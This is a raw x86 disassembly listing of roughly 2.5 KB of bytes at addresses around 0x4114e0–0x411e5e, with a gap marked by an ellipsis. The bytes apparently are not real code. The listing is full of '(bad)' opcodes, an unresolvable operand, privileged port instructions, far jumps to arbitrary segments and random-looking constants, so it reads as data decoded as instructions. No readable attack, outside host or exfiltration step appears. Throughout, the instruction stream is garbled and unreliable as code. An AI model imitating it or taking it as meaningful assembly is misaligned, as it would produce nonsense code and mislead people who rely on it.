  4114e0:	and    ebp,esi
  4114e2:	fidivr DWORD PTR es:[eax+0x5f]
  4114e6:	ret    
  4114e7:	enter  0x4677,0x7d
  4114eb:	push   edx
  4114ec:	mov    cl,0x4c
  4114ee:	dec    edi
  4114ef:	scas   eax,DWORD PTR es:[edi]
  4114f0:	(bad)  
  4114f1:	cdq    
  4114f2:	sub    ebp,DWORD PTR [ebx]
  4114f4:	push   esi
  4114f5:	rol    DWORD PTR ds:0x362b4729,cl
  4114fb:	xchg   ecx,eax
  4114fc:	mov    bh,0x78
  4114fe:	mov    dh,BYTE PTR [esp+edx*8+0x36f14aa]
  411505:	retf   0x74d0
  411508:	dec    ebx
  411509:	fwait
  41150a:	stos   DWORD PTR es:[edi],eax
  41150b:	or     edx,eax
  41150d:	stos   BYTE PTR es:[edi],al
  41150e:	outs   dx,DWORD PTR ds:[esi]
  41150f:	in     al,0x35
  411511:	adc    DWORD PTR [esi-0x9],edi
  411514:	jg     0x4114d0
  411516:	ja     0x411571
  411518:	pop    ebx
  411519:	dec    ecx
  41151a:	loopne 0x411576
  41151c:	stos   DWORD PTR es:[edi],eax
  41151d:	pop    edx
  41151e:	(bad)  
  41151f:	mov    esp,0x6b1fd56d
  411524:	cli    
  411525:	adc    cl,al
  411527:	test   BYTE PTR [edi+eiz*1-0x66],dl
  41152b:	jge    0x4114b6
  41152d:	pop    edi
  41152e:	sbb    BYTE PTR [ecx+0x4e],cl
  411531:	or     al,0xa1
  411533:	cld    
  411534:	mov    ebp,DWORD PTR [edx]
  411536:	or     dh,BYTE PTR [esi]
  411538:	xchg   esi,eax
  411539:	leave  
  41153a:	stos   DWORD PTR es:[edi],eax
  41153b:	std    
  41153c:	sbb    al,0xc8
  41153e:	inc    eax
  41153f:	stos   BYTE PTR es:[edi],al
  411540:	push   edx
  411541:	data16 or BYTE PTR [edx],dh
  411544:	lods   al,BYTE PTR ds:[esi]
  411545:	dec    eax
  411546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411547:	ins    BYTE PTR es:[edi],dx
  411548:	jo     0x411575
  41154a:	mov    es,edx
  41154c:	mov    esi,0x4e684c20
  411551:	fstp   DWORD PTR [eax]
  411553:	mov    esi,0xf9949323
  411558:	jb     0x411538
  41155a:	xor    ebp,esp
  41155c:	or     eax,0xca270c6c
  411561:	es nop
  411563:	inc    esp
  411564:	dec    ecx
  411565:	mov    DWORD PTR [ecx+0x33],eax
  411568:	or     al,0x4e
  41156a:	mov    ds:0x4e90feda,eax
  41156f:	sbb    DWORD PTR [eax+0x114026ee],ebp
  411575:	arpl   si,bp
  411577:	jbe    0x4114ff
  411579:	cwde   
  41157a:	outs   dx,BYTE PTR ds:[esi]
  41157b:	hlt    
  41157c:	jns    0x41151b
  41157e:	aaa    
  41157f:	adc    al,0x2d
  411581:	inc    esi
  411582:	push   ss
  411583:	adc    ecx,edx
  411585:	add    eax,0x7b37bf1e
  41158a:	loopne 0x411544
  41158c:	inc    ecx
  41158d:	jne    0x411586
  41158f:	jl     0x4115e0
  411591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411592:	mov    ch,0x10
  411594:	jne    0x4115bb
  411596:	cdq    
  411597:	fmul   st(3),st
  411599:	in     eax,dx
  41159a:	adc    bl,dl
  41159c:	mov    bh,0x4d
  41159e:	enter  0x207a,0x14
  4115a2:	stc    
  4115a3:	repnz daa 
  4115a5:	packsswb mm6,QWORD PTR [edx+0x3866d268]
  4115ac:	adc    al,dh
  4115ae:	(bad)  
  4115af:	adc    eax,DWORD PTR [ecx]
  4115b1:	jno    0x411620
  4115b3:	jns    0x411548
  4115b5:	std    
  4115b6:	sub    cl,ch
  4115b8:	push   edx
  4115b9:	mov    dh,0xb9
  4115bb:	xchg   ecx,eax
  4115bc:	scas   al,BYTE PTR es:[edi]
  4115bd:	jno    0x411615
  4115bf:	lahf   
  4115c0:	sti    
  4115c1:	pop    esi
  4115c2:	sbb    al,0x27
  4115c4:	into   
  4115c5:	inc    esi
  4115c6:	xor    BYTE PTR [ecx-0x5f],bh
  4115c9:	xchg   esi,eax
  4115ca:	in     eax,0xca
  4115cc:	and    eax,DWORD PTR [ecx+0x22]
  4115cf:	dec    edx
  4115d0:	mov    fs:0xcff46427,al
  4115d6:	inc    ebx
  4115d7:	mov    eax,ds:0xf262bcba
  4115dc:	aam    0xd
  4115de:	sub    al,0x8
  4115e0:	mov    dh,0x61
  4115e2:	adc    ebx,DWORD PTR [esi]
  4115e4:	adc    al,ah
  4115e6:	or     DWORD PTR [eax+0x33],ecx
  4115e9:	or     BYTE PTR [esi],0x95
  4115ec:	add    eax,0x502e606d
  4115f1:	mov    ?,WORD PTR [ecx]
  4115f3:	hlt    
  4115f4:	pop    edx
  4115f5:	inc    esi
  4115f6:	jb     0x41165f
  4115f8:	scas   al,BYTE PTR es:[edi]
  4115f9:	ins    BYTE PTR es:[edi],dx
  4115fa:	dec    esp
  4115fb:	mov    ah,0x26
  4115fd:	lods   al,BYTE PTR ds:[esi]
  4115fe:	push   0x594762f4
  411603:	ds pop esi
  411605:	pushf  
  411606:	sub    ebx,DWORD PTR [esi]
  411608:	sbb    BYTE PTR [eax+0x1432a96],0x7b
  41160f:	shr    esi,cl
  411611:	pop    edx
  411612:	adc    eax,0xe51b2bc9
  411617:	push   0x7881d0d7
  41161c:	ss cmp al,0x72
  41161f:	mov    ecx,0x184ddfc3
  411624:	(bad)  
  411625:	enter  0xfceb,0xf6
  411629:	xlat   BYTE PTR ds:[ebx]
  41162a:	dec    esi
  41162b:	jo     0x4115ef
  41162d:	aam    0x2d
  41162f:	jmp    0x90cae0e3
  411634:	mov    WORD PTR [edi+eax*4+0x36],ss
  411638:	inc    eax
  411639:	dec    edi
  41163a:	cmp    esp,DWORD PTR es:[eax]
  41163d:	(bad)  
  41163e:	bound  edx,QWORD PTR [esi+ecx*8-0x25]
  411642:	dec    esp
  411643:	push   0x4a
  411645:	cmp    BYTE PTR [esi-0x4214bf64],cl
  41164b:	out    dx,eax
  41164c:	add    al,dl
  41164e:	mov    edi,0xff9646c6
  411653:	aaa    
  411654:	nop
  411655:	jge    0x411640
  411657:	scas   al,BYTE PTR es:[edi]
  411658:	push   es
  411659:	retf   0x3a3f
  41165c:	sbb    DWORD PTR [eax],edi
  41165e:	scas   al,BYTE PTR es:[edi]
  41165f:	adc    esp,DWORD PTR [edi+0x5369bf9e]
  411665:	or     BYTE PTR [edx+edi*8],ch
  411668:	push   ebx
  411669:	adc    ebx,DWORD PTR [ebp+0x522944cf]
  41166f:	dec    ecx
  411670:	(bad)  [ecx+0x69]
  411673:	rcr    DWORD PTR [ebx+0x65],1
  411676:	js     0x411662
  411678:	in     al,0xee
  41167a:	sbb    eax,edi
  41167c:	into   
  41167d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41167e:	mov    dl,0xd8
  411680:	xor    al,0x39
  411682:	cmc    
  411683:	pop    ebx
  411684:	and    ah,BYTE PTR [edx]
  411686:	rol    DWORD PTR [edx],1
  411688:	jecxz  0x41166c
  41168a:	aaa    
  41168b:	into   
  41168c:	jmp    0xb963:0x9b9ee9b1
  411693:	int    0x9e
  411695:	sbb    DWORD PTR [ebp+0xb475bab],esp
  41169b:	std    
  41169c:	popa   
  41169d:	(bad)  
  41169f:	dec    ebx
  4116a0:	sub    BYTE PTR [ecx],cl
  4116a2:	xchg   ebp,eax
  4116a3:	pop    esp
  4116a4:	mov    ah,BYTE PTR [ecx]
  4116a6:	dec    esi
  4116a7:	cld    
  4116a8:	ins    BYTE PTR es:[edi],dx
  4116a9:	xlat   BYTE PTR ds:[ebx]
  4116aa:	mov    edi,ds
  4116ac:	jle    0x411700
  4116ae:	rol    bl,1
  4116b0:	xchg   esi,eax
  4116b1:	lahf   
  4116b2:	push   0xfffffff2
  4116b4:	js     0x411694
  4116b6:	mov    ecx,0xfd0389eb
  4116bb:	in     eax,0x83
  4116bd:	cmp    esi,DWORD PTR [ebx+0xfcb1243]
  4116c3:	sti    
  4116c4:	in     eax,0x80
  4116c6:	inc    ecx
  4116c7:	xor    eax,0xc97d4ac4
  4116cc:	or     esi,eax
  4116ce:	enter  0x696e,0xb6
  4116d2:	jp     0x41173a
  4116d4:	ret    
  4116d5:	arpl   WORD PTR [eax+ebp*1-0x68],si
  4116d9:	ss jg  0x4116b5
  4116dc:	and    al,0x6d
  4116de:	bound  esi,QWORD PTR [edx+0xb]
  4116e1:	mov    ds:0x79f808be,eax
  4116e6:	(bad)  
  4116e7:	push   esp
  4116e8:	daa    
  4116e9:	arpl   dx,bp
  4116eb:	pop    es
  4116ec:	lds    esi,FWORD PTR [edx-0x7bbd2da7]
  4116f2:	mov    ch,0x13
  4116f4:	pop    edx
  4116f5:	and    BYTE PTR fs:[eax+0x1902ce71],bl
  4116fc:	ins    BYTE PTR es:[edi],dx
  4116fd:	gs dec edx
  4116ff:	scas   al,BYTE PTR es:[edi]
  411700:	repz std 
  411702:	stos   DWORD PTR es:[edi],eax
  411703:	std    
  411704:	dec    ebx
  411705:	mov    ds:0x7042ec84,al
  41170a:	out    0xca,al
  41170c:	push   ebx
  41170d:	test   DWORD PTR [ebx+0x2e],edi
  411710:	inc    esi
  411711:	push   eax
  411712:	mov    ch,0xf4
  411714:	addr16 addr16 fs lock jge 0x4116c3
  41171a:	mov    cl,0xcf
  41171c:	and    al,0xf3
  41171e:	test   DWORD PTR [edx+0x71f336b2],ebx
  411724:	mov    ebx,0xd08b8cc0
  411729:	in     eax,dx
  41172a:	inc    eax
  41172b:	mov    ebp,0xead0b43c
  411730:	rcr    DWORD PTR [edx],1
  411732:	adc    al,0x7d
  411734:	ret    0x9255
  411737:	xor    eax,0x50dc8011
  41173c:	imul   ebx,DWORD PTR [eax-0x79]
  411740:	stos   BYTE PTR es:[edi],al
  411741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411742:	jecxz  0x4117a5
  411744:	inc    edi
  411745:	or     edx,DWORD PTR [edi-0x7bc60cf0]
  41174b:	push   0x2f
  41174d:	enter  0x8a79,0x5d
  411751:	(bad)  
  411752:	dec    ecx
  411753:	rcr    bl,cl
  411755:	fistp  WORD PTR [esi]
  411757:	dec    ebx
  411758:	std    
  411759:	push   ebx
  41175a:	and    al,0xa
  41175c:	xor    esi,ecx
  41175e:	push   esp
  41175f:	ins    BYTE PTR es:[edi],dx
  411760:	enter  0x2d14,0x7e
  411764:	inc    edi
  411765:	lea    esi,[ebp+0x13]
  411768:	stc    
  411769:	sub    dh,bl
  41176b:	jne    0x411733
  41176d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41176e:	je     0x41172b
  411770:	js     0x4117b3
  411772:	sbb    al,0x7f
  411774:	mov    ebx,ebx
  411776:	xor    BYTE PTR [ecx+0x11386619],0x52
  41177d:	fimul  DWORD PTR [ecx]
  41177f:	clc    
  411780:	xchg   esi,eax
  411781:	fbld   TBYTE PTR ds:0xb1596db3
  411787:	jmp    0xa7d0:0xbca53af8
  41178e:	dec    ebp
  41178f:	int3   
  411790:	enter  0x3f05,0xba
  411794:	ffreep st(4)
  411796:	adc    BYTE PTR [eax-0x491cd142],0x98
  41179d:	jno    0x41172c
  41179f:	cmp    esi,esp
  4117a1:	cld    
  4117a2:	inc    ebx
  4117a3:	mov    eax,0x65f4dfa1
  4117a8:	xchg   esp,eax
  4117a9:	sbb    DWORD PTR [esi+0xd],edx
  4117ac:	add    BYTE PTR [edi+ecx*4],ah
  4117af:	imul   DWORD PTR [esi]
  4117b1:	stos   DWORD PTR es:[edi],eax
  4117b2:	outs   dx,DWORD PTR ds:[esi]
  4117b3:	pop    ecx
  4117b4:	mov    cs,WORD PTR [eax+0x67fb71b]
  4117ba:	(bad)  
  4117bb:	imul   esi,DWORD PTR [eax-0x56a482b2],0xffffff8c
  4117c2:	shr    DWORD PTR [edx+0x1f],0x4a
  4117c6:	(bad)  
  4117c7:	pop    edx
  4117c8:	pop    esi
  4117c9:	adc    edi,DWORD PTR [ebx-0x49]
  4117cc:	rcl    DWORD PTR [eax+edi*2],1
  4117cf:	push   ecx
  4117d0:	cmp    DWORD PTR [ebx+0x59],eax
  4117d3:	jecxz  0x411833
  4117d5:	jae    0x411835
  4117d7:	lods   al,BYTE PTR ds:[esi]
  4117d8:	test   al,dl
  4117da:	cmp    al,0x7a
  4117dc:	inc    esp
  4117dd:	mov    ebp,0x1544f7e3
  4117e2:	sbb    DWORD PTR [edi-0x23],ebx
  4117e5:	and    eax,0xc5dba3f
  4117ea:	pop    ebx
  4117eb:	popa   
  4117ec:	jp     0x411779
  4117ee:	jb     0x4117c8
  4117f0:	jmp    0x4117f8
  4117f2:	mov    al,0xe2
  4117f4:	cld    
  4117f5:	outs   dx,DWORD PTR ds:[esi]
  4117f6:	add    ah,BYTE PTR [esp+edx*8-0x7f8e224a]
  4117fd:	cmp    ah,BYTE PTR [esi-0x54]
  411800:	mov    ebx,0x2c5c7a55
  411805:	int    0xa2
  411807:	cli    
  411808:	or     eax,0x36387bb7
  41180d:	or     al,0xf
  41180f:	pop    ecx
  411810:	inc    ebp
  411811:	ins    BYTE PTR es:[edi],dx
  411812:	icebp  
  411813:	fimul  WORD PTR fs:[eax+0x75556159]
  41181a:	or     DWORD PTR ds:0xf17ef73a,edi
  411820:	pop    ecx
  411821:	(bad)  
  411822:	mov    al,0xef
  411824:	fwait
  411825:	sbb    eax,0xa27d9590
  41182a:	leave  
  41182b:	cs icebp 
  41182d:	repz xor DWORD PTR [edi-0x48],ecx
  411831:	xor    eax,0xb88e1ffd
  411836:	mov    ds:0xef606113,eax
  41183b:	rcr    BYTE PTR [ebx+edx*1-0x17],1
  41183f:	xor    eax,0xee4625a1
  411844:	jb     0x41185f
  411846:	add    edx,DWORD PTR [ebx]
  411848:	jp     0x411808
  41184a:	shl    BYTE PTR [esi],cl
  41184c:	hlt    
  41184d:	mov    edx,0xb63e1a57
  411852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411853:	call   0xb9dd:0x70bc3851
  41185a:	jmp    0xa297:0x9e825dba
  411861:	les    edx,FWORD PTR [edx+edx*4+0x3804d8c1]
  411868:	lods   al,BYTE PTR ds:[esi]
  411869:	or     al,BYTE PTR [edx+0x26]
  41186c:	rep outs dx,DWORD PTR ds:[esi]
  41186e:	retf   
  41186f:	mov    al,ds:0x1d200f5c
  411874:	xchg   ebx,eax
  411875:	hlt    
  411876:	mov    DWORD PTR [ebx+edx*4-0x75],ebx
  41187a:	xor    DWORD PTR [esi+0x5b],0xffffffca
  41187e:	inc    ebp
  41187f:	mov    dl,0x4
  411881:	xchg   DWORD PTR fs:0x26c83917,ecx
  411888:	loope  0x411901
  41188a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41188b:	dec    ebx
  41188c:	fcomp  st(6)
  41188e:	jnp    0x41187e
  411890:	(bad)  
  411892:	sbb    bh,BYTE PTR [esi-0x5f]
  411895:	stos   DWORD PTR es:[edi],eax
  411896:	cli    
  411897:	aas    
  411898:	loop   0x41184c
  41189a:	fcom   st(2)
  41189c:	retf   0xc7e3
  41189f:	sub    al,0x3
  4118a1:	inc    ebp
  4118a2:	int    0xa9
  4118a4:	mov    esp,DWORD PTR [edx]
  4118a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a7:	sbb    DWORD PTR [edi],edi
  4118a9:	cs dec esi
  4118ab:	sahf   
  4118ac:	and    eax,0x7baef1f7
  4118b1:	adc    esp,esp
  4118b3:	cmp    eax,0x20e4b8ae
  4118b8:	inc    eax
  4118b9:	shl    ecx,cl
  4118bb:	cwde   
  4118bc:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4118be:	cmp    BYTE PTR [esi+ecx*4+0xc8d20c7],0xa1
  4118c6:	cmp    DWORD PTR [ecx+0x0],0x178e8ef1
  4118cd:	in     eax,dx
  4118ce:	rcpps  xmm1,XMMWORD PTR [eax+0x3b]
  4118d2:	xor    ch,BYTE PTR [ebp-0x64951e68]
  4118d8:	inc    esp
  4118d9:	xor    DWORD PTR [esi+0x4e],edx
  4118dc:	and    DWORD PTR [esp+ebx*2-0x5e],0x41c360d4
  4118e4:	mov    ebx,0x6ca63cfc
  4118e9:	adc    edx,DWORD PTR [edi+0x42d38141]
  4118ef:	and    bh,BYTE PTR [eax+0x4ace98a9]
  4118f5:	aaa    
  4118f6:	xchg   ebx,eax
  4118f7:	std    
  4118f8:	idiv   DWORD PTR [edx+0x29]
  4118fb:	inc    edi
  4118fc:	mov    bl,0x56
  4118fe:	push   edi
  4118ff:	cwde   
  411900:	out    dx,al
  411901:	jge    0x41194d
  411903:	mov    bh,0x59
  411905:	mov    edx,0x5c2f6a9b
  41190a:	push   es
  41190b:	jecxz  0x411916
  41190d:	pop    ebp
  41190e:	jae    0x411942
  411910:	xchg   edx,eax
  411911:	retf   0x7a81
  411914:	fs mov ebp,0x6fb22176
  41191a:	lock dec ebx
  41191c:	or     bl,al
  41191e:	dec    edx
  41191f:	mov    dl,0xb7
  411921:	imul   ebx,DWORD PTR [edi-0x56],0x55
  411925:	mov    bh,0x69
  411927:	in     al,0xf8
  411929:	iret   
  41192a:	push   ebp
  41192b:	(bad)  
  41192c:	xchg   esi,eax
  41192d:	mov    esi,0xad0e336f
  411932:	mov    esi,esp
  411934:	mov    cl,0xb2
  411936:	jl     0x411975
  411938:	repz cmp BYTE PTR [eax],0xd
  41193c:	cld    
  41193d:	aam    0x16
  41193f:	push   ebx
  411940:	sbb    BYTE PTR ds:0xa27b4db9,dl
  411946:	mov    eax,0xab7c6ef4
  41194b:	pop    eax
  41194c:	mov    WORD PTR [ecx-0x546303ee],ds
  411952:	retf   
  411953:	pop    DWORD PTR [edi]
  411955:	in     al,0x66
  411957:	and    BYTE PTR [edi-0x6ab62f34],bh
  41195d:	es (bad) 
  41195f:	idiv   DWORD PTR [ebp-0x4b]
  411962:	sbb    eax,esi
  411964:	popf   
  411965:	xchg   esp,eax
  411966:	mov    ds:0xa2b05985,al
  41196b:	xor    eax,0xd669a00a
  411970:	shr    DWORD PTR [esi],0xf1
  411973:	dec    eax
  411974:	loope  0x411904
  411976:	xchg   esp,eax
  411977:	pop    ecx
  411978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411979:	and    eax,0x91e09157
  41197e:	sbb    edx,DWORD PTR [esi]
  411980:	out    dx,eax
  411981:	mov    bl,0x3f
  411983:	(bad)  
  411985:	lahf   
  411986:	push   ds
  411987:	ficomp WORD PTR cs:[ebx+eiz*8-0x2d]
  41198c:	pop    ebx
  41198d:	jne    0x4119be
  41198f:	outs   dx,DWORD PTR ds:[esi]
  411990:	and    edi,DWORD PTR [esi]
  411992:	and    eax,0x59efdf40
  411997:	jno    0x4119ba
  411999:	add    DWORD PTR [eax-0x39],edi
  41199c:	dec    ebx
  41199d:	les    ebp,FWORD PTR [bp+si+0x21d2]
  4119a2:	xchg   ebx,eax
  4119a3:	or     eax,0x8b96a2db
  4119a8:	ror    ch,0xf9
  4119ab:	inc    edx
  4119ac:	adc    DWORD PTR [edx],esi
  4119ae:	out    0x35,eax
  4119b0:	arpl   WORD PTR [eax],di
  4119b2:	aas    
  4119b3:	xchg   edi,eax
  4119b4:	push   ecx
  4119b5:	mov    DWORD PTR [esi-0x3c779fd7],esi
  4119bb:	or     BYTE PTR [ecx],0xac
  4119be:	loop   0x411a0e
  4119c0:	push   edx
  4119c1:	jp     0x411992
  4119c3:	pop    es
  4119c4:	mov    ebp,0x314381fb
  4119c9:	jmp    0x100c533
  4119ce:	shr    DWORD PTR [ecx+0x41],cl
  4119d1:	xor    eax,0x6e3dd754
  4119d6:	ret    0x8c46
  4119d9:	pop    ds
  4119da:	dec    ebp
  4119db:	sub    ecx,DWORD PTR [edx-0x6d3fb3b4]
  4119e1:	mov    DWORD PTR [eax],ebp
  4119e3:	xchg   esp,eax
  4119e4:	(bad)  
  4119e5:	dec    edx
  4119e6:	sbb    DWORD PTR ds:0xc28334c4,ecx
  4119ec:	into   
  4119ed:	pop    ebp
  4119ee:	test   bl,cl
  4119f0:	mov    eax,0x7e6d5f82
  4119f5:	retf   0xd8a5
  4119f8:	fs jmp 0x411a5f
  4119fb:	mov    ds:0x3146252e,al
  411a00:	test   DWORD PTR [edx+0x71],0x41c695d3
  411a07:	retf   0xc1f3
  411a0a:	pushf  
  411a0b:	enter  0x4834,0x72
  411a0f:	hlt    
  411a10:	mov    ecx,0xbddf0824
  411a15:	cmp    BYTE PTR [eax+0x43],cl
  411a18:	xchg   ebp,eax
  411a19:	stos   DWORD PTR es:[edi],eax
  411a1a:	xor    al,0xb2
  411a1c:	push   es
  411a1d:	retf   0xc0a9
  411a20:	inc    ecx
  411a21:	imul   esp,DWORD PTR [ebp-0x2060a6b],0xffffffe0
  411a28:	xchg   edx,eax
  411a29:	xor    al,0x15
  411a2b:	mov    edx,0x4dad1899
  411a30:	stos   DWORD PTR es:[edi],eax
  411a31:	xor    al,0x92
  411a33:	hlt    
  411a34:	out    0x30,eax
  411a36:	fsub   DWORD PTR [edi-0x46]
  411a39:	inc    ebp
  411a3a:	repnz sbb DWORD PTR [ebx+0x2872a84d],edx
  411a41:	jge    0x411a1b
  411a43:	and    ecx,0x6d
  411a46:	aas    
  411a47:	aad    0x91
  411a49:	shr    esi,1
  411a4b:	mov    ds:0x34ac0a4d,eax
  411a50:	cmp    esp,esi
  411a52:	jmp    0x411a16
  411a54:	jno    0x411acb
  411a56:	cmp    cl,BYTE PTR [esi-0x35562b16]
  411a5c:	jns    0x411a66
  411a5e:	mov    al,0x3a
  411a60:	stos   DWORD PTR es:[edi],eax
  411a61:	xor    BYTE PTR [eax-0x60],ch
  411a64:	rcr    DWORD PTR [ebx+ecx*4-0x7b],1
  411a68:	ret    
  411a69:	hlt    
  411a6a:	(bad)
	...
  411c42:	add    BYTE PTR [eax],al
  411c44:	daa    
  411c45:	and    eax,0xbb873b85
  411c4a:	mov    edi,0xe22d13d
  411c4f:	pusha  
  411c50:	jne    0x411c69
  411c52:	sub    dh,dl
  411c54:	dec    ebx
  411c55:	ja     0x411c58
  411c57:	add    BYTE PTR [edx],ah
  411c59:	pop    es
  411c5a:	add    BYTE PTR [eax],al
  411c5c:	fnstenv [edx-0x4c6f1f42]
  411c62:	dec    ecx
  411c63:	add    ch,bl
  411c65:	sub    al,BYTE PTR [edi-0x73]
  411c68:	fsubr  QWORD PTR [eax+0x1e]
  411c6b:	cmp    al,0x78
  411c6d:	mov    al,ds:0x73d096e7
  411c72:	ins    DWORD PTR es:[edi],dx
  411c73:	jbe    0x411c61
  411c75:	scas   al,BYTE PTR es:[edi]
  411c76:	aas    
  411c77:	ret    
  411c78:	push   0xffffffbe
  411c7a:	push   0x5c
  411c7c:	push   edi
  411c7d:	and    ecx,eax
  411c7f:	dec    ch
  411c81:	(bad)  
  411c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c84:	pop    ss
  411c85:	imul   BYTE PTR [esi-0x77]
  411c88:	sbb    dh,BYTE PTR [ebx+0x21]
  411c8b:	mov    bl,0xcf
  411c8d:	jmp    0x4c12:0xbbcc0631
  411c94:	mov    ds:0x5ae8453c,al
  411c99:	mov    eax,ds:0x2d6a6f29
  411c9e:	pop    ecx
  411c9f:	xchg   esp,eax
  411ca0:	loop   0x411cd0
  411ca2:	mov    ds:0xfd99053e,al
  411ca7:	push   edx
  411ca8:	in     al,0xa1
  411caa:	xchg   ecx,eax
  411cab:	adc    eax,0x81268aba
  411cb0:	xchg   BYTE PTR [eax-0x5c7e0e48],dl
  411cb6:	fisubr DWORD PTR ds:0x93e8f7d0
  411cbc:	mov    ch,0x89
  411cbe:	cmp    eax,0x82deb2ba
  411cc3:	pop    ds
  411cc4:	pop    esi
  411cc5:	inc    esp
  411cc6:	xchg   edi,eax
  411cc7:	mov    al,0x50
  411cc9:	dec    edi
  411cca:	adc    al,0xbd
  411ccc:	retf   
  411ccd:	mov    esi,0x897d4946
  411cd2:	pusha  
  411cd3:	ret    0x76cb
  411cd6:	pusha  
  411cd7:	nop
  411cd8:	loopne 0x411c97
  411cda:	mov    eax,0x870d7070
  411cdf:	jo     0x411c98
  411ce1:	jo     0x411c73
  411ce3:	xlat   BYTE PTR ds:[ebx]
  411ce4:	adc    DWORD PTR [ebx-0x3abf43b2],eax
  411cea:	mov    al,0x4f
  411cec:	ficom  DWORD PTR [ecx+0x50]
  411cef:	push   eax
  411cf0:	pop    ss
  411cf1:	(bad)  
  411cf2:	mov    eax,0xa6667436
  411cf7:	test   BYTE PTR [ebx+0x74be9d00],al
  411cfd:	inc    esp
  411cfe:	outs   dx,BYTE PTR ds:[esi]
  411cff:	push   0x62
  411d01:	push   es
  411d02:	pop    edi
  411d03:	sbb    esi,DWORD PTR [esi-0x6bebcee4]
  411d09:	add    ebx,DWORD PTR gs:[esi]
  411d0c:	aam    0x9a
  411d0e:	add    DWORD PTR [edx+eax*4+0x791f8cde],0xffffff95
  411d16:	jb     0x411ca7
  411d18:	ror    DWORD PTR [esp+esi*8-0x48],1
  411d1c:	rcr    BYTE PTR ds:0x9ecb3d8f,1
  411d22:	lods   al,BYTE PTR ds:[esi]
  411d23:	add    al,0xf2
  411d25:	dec    ebp
  411d26:	pop    edx
  411d27:	rcl    DWORD PTR [eax-0x7c5a19bc],0x93
  411d2e:	in     al,dx
  411d2f:	jmp    0xe2d58139
  411d34:	pusha  
  411d35:	jmp    0xa97047d3
  411d3a:	ja     0x411d1c
  411d3c:	int3   
  411d3d:	adc    DWORD PTR [edi+0xa],0x7c769e59
  411d44:	dec    eax
  411d45:	enter  0xf55c,0xc8
  411d49:	es aas 
  411d4b:	dec    esp
  411d4c:	mov    dh,0xde
  411d4e:	xchg   DWORD PTR [ebx],esi
  411d50:	stos   DWORD PTR es:[edi],eax
  411d51:	add    BYTE PTR [eax+0x61c1b23e],0xd2
  411d58:	jmp    FWORD PTR [ebx+0x6ea4e40b]
  411d5e:	out    dx,eax
  411d5f:	scas   eax,DWORD PTR es:[edi]
  411d60:	push   ss
  411d61:	mov    bl,0xcb
  411d63:	xchg   ecx,eax
  411d64:	je     0x411d40
  411d66:	(bad)  
  411d67:	int3   
  411d68:	mov    ecx,0xdcf64d0a
  411d6d:	loopne 0x411dc3
  411d6f:	adc    eax,0x89616f1b
  411d74:	pop    es
  411d75:	retf   0x5c7e
  411d78:	and    BYTE PTR ds:[ebp+0x7cce02a5],0x4f
  411d80:	cmp    al,bl
  411d82:	pop    edi
  411d83:	int    0xe6
  411d85:	add    cl,BYTE PTR [edi-0x78a0d40]
  411d8b:	aaa    
  411d8c:	inc    eax
  411d8d:	es push cs
  411d8f:	(bad)  
  411d90:	xchg   ebx,eax
  411d91:	(bad)  
  411d92:	dec    esp
  411d93:	sbb    edx,ebx
  411d95:	call   0x4d76:0xc279b6b
  411d9c:	mov    dh,0x12
  411d9e:	data16 add BYTE PTR [ecx],ch
  411da1:	dec    esi
  411da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411da4:	push   eax
  411da5:	xor    eax,0x129afde3
  411daa:	sbb    BYTE PTR [ebp-0x1c18ba3],ch
  411db0:	adc    esp,ecx
  411db2:	mov    edi,0x4ae7cc6e
  411db7:	or     eax,0x457f5d92
  411dbc:	jae    0x411d88
  411dbe:	nop
  411dbf:	imul   esp,ebp,0xa8b2cddf
  411dc5:	mov    ecx,0x40ca1778
  411dca:	dec    esi
  411dcb:	retf   0x63fb
  411dce:	sbb    eax,0x2d833cb5
  411dd3:	jge    0x411d5e
  411dd5:	in     eax,dx
  411dd6:	outs   dx,DWORD PTR ds:[esi]
  411dd7:	in     eax,0x92
  411dd9:	or     DWORD PTR ds:0x1842ffe1,esi
  411ddf:	mul    BYTE PTR [ebx+0x32]
  411de2:	mov    dl,0xd1
  411de4:	mov    ebp,0xe414a710
  411de9:	das    
  411dea:	mov    ecx,0x40083610
  411def:	xor    BYTE PTR [esi+0x7b6afaf9],dl
  411df5:	adc    cl,BYTE PTR [ecx+edi*4]
  411df8:	jmp    0xe94eb1c3
  411dfd:	or     ebx,edi
  411dff:	outs   dx,DWORD PTR ds:[esi]
  411e00:	mov    ds:0x79491663,al
  411e05:	jnp    0x411e03
  411e07:	dec    edx
  411e08:	into   
  411e09:	dec    ebp
  411e0a:	xlat   BYTE PTR ds:[ebx]
  411e0b:	jb     0x411e06
  411e0d:	pop    esp
  411e0e:	sub    eax,0x9543faba
  411e13:	mul    BYTE PTR [edx]
  411e15:	push   esp
  411e16:	push   ds
  411e17:	xor    al,0xa5
  411e19:	adc    BYTE PTR [ecx],cl
  411e1b:	pop    eax
  411e1c:	push   esp
  411e1d:	bnd jb 0x411da8
  411e20:	and    dl,BYTE PTR [edi-0x6f]
  411e23:	mov    bl,0x90
  411e25:	cmp    esi,DWORD PTR [esi+0x2b71b321]
  411e2b:	cwde   
  411e2c:	add    al,0x70
  411e2e:	mov    ah,0x41
  411e30:	(bad)  
  411e31:	js     0x411ea7
  411e33:	sbb    bl,dl
  411e35:	and    al,0x1e
  411e37:	push   esi
  411e38:	je     0x411eb9
  411e3a:	test   eax,0x5496e248
  411e3f:	sub    al,0xe6
  411e41:	ss dec ebx
  411e43:	dec    ecx
  411e44:	pushf  
  411e45:	clc    
  411e46:	add    eax,0x9721dfd9
  411e4b:	pop    ds
  411e4c:	pop    ss
  411e4d:	imul   ebx,edx,0xb
  411e50:	mov    DWORD PTR [edx*4+0x2108214b],ecx
  411e57:	out    0xf5,al
  411e59:	stos   BYTE PTR es:[edi],al
  411e5a:	xor    al,0x13
  411e5c:	jb     0x411ec1
  411e5e:	pop    edi
